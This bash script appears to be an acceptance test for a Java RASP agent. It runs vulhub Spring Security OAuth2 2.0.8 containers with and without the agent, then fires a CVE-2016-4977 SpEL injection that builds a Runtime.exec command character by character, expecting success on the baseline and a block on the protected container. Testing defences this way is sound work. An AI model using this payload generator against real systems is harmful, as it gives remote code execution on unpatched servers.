#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_SPRING_SECURITY_OAUTH_IMAGE:-vulhub/spring-security-oauth2:2.0.8}"
baseline_name="${OHMYRASP_VULHUB_SPRING_SECURITY_OAUTH_BASELINE_NAME:-ohmyrasp-vulhub-spring4977-baseline}"
protected_name="${OHMYRASP_VULHUB_SPRING_SECURITY_OAUTH_PROTECTED_NAME:-ohmyrasp-vulhub-spring4977-protected}"
baseline_port="${OHMYRASP_VULHUB_SPRING_SECURITY_OAUTH_BASELINE_PORT:-19158}"
protected_port="${OHMYRASP_VULHUB_SPRING_SECURITY_OAUTH_PROTECTED_PORT:-19159}"
baseline_dir="logs/vulhub-spring-security-oauth2-2.0.8-java8-baseline"
protected_dir="logs/vulhub-spring-security-oauth2-2.0.8-java8-protected"
protected_log="${protected_dir}/events.jsonl"
success_file="/tmp/ohmyrasp-spring4977-success"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for_oauth() {
  local name="$1"
  local port="$2"
  local output="$3"
  local status

  for _ in $(seq 1 180); do
    status="$(curl -sS -o "$output" -w "%{http_code}" \
      "http://127.0.0.1:${port}/oauth/authorize?response_type=code&client_id=acme&scope=openid&redirect_uri=http://test" \
      2>/dev/null || true)"
    if [[ "$status" == "401" || "$status" == "400" ]]; then
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose Spring Security OAuth authorize endpoint at ${port}" >&2
  exit 1
}

expect_protected_startup_without_detection() {
  if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
    sed -n '1,120p' "$protected_log" >&2 || true
    echo "missing Java 8 startup event in protected Spring Security OAuth container" >&2
    exit 1
  fi
  if ! grep -q '"command_hook":"installed"' "$protected_log"; then
    sed -n '1,120p' "$protected_log" >&2
    echo "missing Java 8 command hook startup marker in protected Spring Security OAuth container" >&2
    exit 1
  fi
  if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
    sed -n '1,160p' "$protected_log" >&2
    echo "protected Spring Security OAuth container produced a detection before exploit traffic" >&2
    exit 1
  fi
}

build_oauth_url() {
  local port="$1"
  local marker="$2"

  python3 - "$port" "$marker" <<'PY'
import sys
from urllib.parse import urlencode

port = sys.argv[1]
command = "touch " + sys.argv[2]
expression = "${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%d)" % ord(command[0])
for char in command[1:]:
    expression += ".concat(T(java.lang.Character).toString(%d))" % ord(char)
expression += ")}"
params = {
    "response_type": expression,
    "client_id": "acme",
    "scope": "openid",
    "redirect_uri": "http://test",
}
print("http://127.0.0.1:%s/oauth/authorize?%s" % (port, urlencode(params)))
PY
}

send_oauth_payload() {
  local port="$1"
  local marker="$2"
  local output="$3"
  local url

  url="$(build_oauth_url "$port" "$marker")"
  curl -sS -o "$output" -w "%{http_code}" -u admin:admin "$url" || true
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" \
  -p "${baseline_port}:8080" \
  "$image" >/dev/null

docker run -d --name "$protected_name" \
  -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for_oauth "$baseline_name" "$baseline_port" "${baseline_dir}/authorize-ready.response"
wait_for_oauth "$protected_name" "$protected_port" "${protected_dir}/authorize-ready.response"
expect_protected_startup_without_detection

baseline_status="$(
  send_oauth_payload "$baseline_port" "$success_file" "${baseline_dir}/authorize-exploit.response"
)"
if [[ "$baseline_status" == "000" ]]; then
  sed -n '1,120p' "${baseline_dir}/authorize-exploit.response" >&2 || true
  echo "baseline Spring Security OAuth exploit request did not reach the server" >&2
  exit 1
fi
if ! grep -q 'java.lang.UNIXProcess' "${baseline_dir}/authorize-exploit.response"; then
  sed -n '1,160p' "${baseline_dir}/authorize-exploit.response" >&2 || true
  echo "baseline Spring Security OAuth response did not show evaluated Runtime.exec result" >&2
  exit 1
fi
if ! docker exec "$baseline_name" sh -c "test -e '${success_file}'"; then
  sed -n '1,160p' "${baseline_dir}/authorize-exploit.response" >&2 || true
  echo "baseline Spring Security OAuth did not create ${success_file}" >&2
  exit 1
fi

protected_status="$(
  send_oauth_payload "$protected_port" "$success_file" "${protected_dir}/authorize-exploit.response"
)"
if [[ "$protected_status" == "000" ]]; then
  sed -n '1,120p' "${protected_dir}/authorize-exploit.response" >&2 || true
  echo "protected Spring Security OAuth exploit request did not reach the server" >&2
  exit 1
fi
if docker exec "$protected_name" sh -c "test -e '${success_file}'"; then
  echo "protected Spring Security OAuth created ${success_file} despite Java8 RASP" >&2
  exit 1
fi
if ! grep -q '"algorithm":"java8_command_execution_exploit_primitive".*"action":"block"' "$protected_log"; then
  sed -n '1,200p' "$protected_log" >&2
  echo "missing java8_command_execution_exploit_primitive block event for Spring Security OAuth CVE-2016-4977" >&2
  exit 1
fi

echo "vulhub Spring Security OAuth CVE-2016-4977 Java8 acceptance passed"
